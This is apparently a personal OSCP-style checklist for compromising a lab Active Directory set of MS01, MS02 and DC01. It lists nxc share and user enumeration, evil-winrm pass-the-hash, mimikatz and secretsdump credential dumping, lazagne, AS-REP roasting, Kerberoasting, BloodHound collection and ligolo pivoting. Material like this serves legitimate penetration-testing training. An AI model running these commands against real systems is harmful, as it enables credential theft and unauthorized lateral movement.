Get Exam AD Credentials.

Fullscan nmap scan + List all open ports/services

Collect info:

```
nxc smb $IP -u '' -p '' —-shares
nxc smb $IP -u 'guest' -p '' —-shares
```

RDP/WinRM to MS01

```
xfreerdp3 /v:192.168.109.250 /u:'offsec' /p:'lab' /cert:ignore /dynamic-resolution /drive:linux,/opt/ +clipboard

evil-winrm -i 10.10.109.140 -u 'Administrator' -p ‘password’
evil-winrm -i 10.10.109.140 -u 'Administrator' -H 59b280ba707d22e3ef0aa587fc29ffe5
```

____
PrivEsc:

- [ ] Quick check C drive for non default folders
- [ ] Quick check Program Files for non default software
- [ ] `tree /F /A .` on C:/Users/
- [ ] Run `whoami /all`, then PrivEscCheck, then WinPEAS
- [ ] This will give you all info you need. Save output and slowly go over it.
- [ ] If you get completely stuck, you can manually check for things too.

____
Post Exploitation:

Once Admin:

mimikatz:

```
.\mimikatz.exe "log" "privilege::debug" "token::elevate" "lsadump::lsa /inject" "sekurlsa::logonpasswords" exit
```

secretsdump:

```
secretsdump.py 'oscp.exam/boris.crawford'@192.168.193.172
```

lazagne:

```
.\lazagne.exe all
```

Creds Found?
- Setup ligolo pivoting
- Try authenticating with every possible protocol with those set of credentials. winrm, rdp, mssql, smb, etc. including --local-auth

No Creds Found?
- Try Setup ligolo pivoting and try to get MS02 and DC01 info (shares, bloodhound data, domain users)
- Search the filesystem for suspicious files containing potential creds

Try:

```
nxc ldap $IP -u <u> -p <p> --asreproast asreproast.out

nxc ldap $IP -u <u> -p <p> --kerberoasting kerberoasting.out

nxc smb $IP -u <u> -p <p> --users-export users

nxc ldap $IP -u <u> -p <p> --no-preauth-targets users --kerberoasting output.txt

nxc smb $IP -u <u> -p <p> --rid-brute | grep SidTypeUser | cut -d "\\" -f 2 | cut -d " " -f 1 | grep -v \\$ > users

nxc ldap <ip> -u user -p pass --bloodhound --collection All --dns-server <IP_DC>
```

___

MS02:

Fullscan + List all open ports/services

net localgroup Administrators - to check the username you will most likely need to obtain creds to (not guaranteed)

Collect info:
- nxc smb ms02 dc01 check guest and null auth shares
- nxc smb ms02 dc01 check all owned users shares
____
PrivEsc:

- [ ] Quick check C drive for non default folders
- [ ] tree /F /A . on C:/Users/
- [ ] Run whoami /all, then PrivEscCheck, then WinPEAS
- [ ] This will give you all info you need. Save output and slowly go over it.
- [ ] If you get completely stuck, you can manually check for things too.

____
Post Exploitation:

Once Admin:

mimikatz:

```
.\mimikatz.exe "log" "privilege::debug" "token::elevate" "lsadump::lsa /inject" "sekurlsa::logonpasswords" exit
```

secretsdump:

```
secretsdump.py 'oscp.exam/boris.crawford'@192.168.193.172
```

lazagne:

```
.\lazagne.exe all
```

Creds Found?
- Try authenticating with every possible protocol with those set of credentials. winrm, rdp, mssql, smb including --local-auth

No Creds Found?
- Search the filesystem for suspicious files/folders containing potential creds

Pay attention if any of your owned users have Outbound Privileges using BloodHound (GenericAll etc.), double check for asreproastable and kerberoastable users.

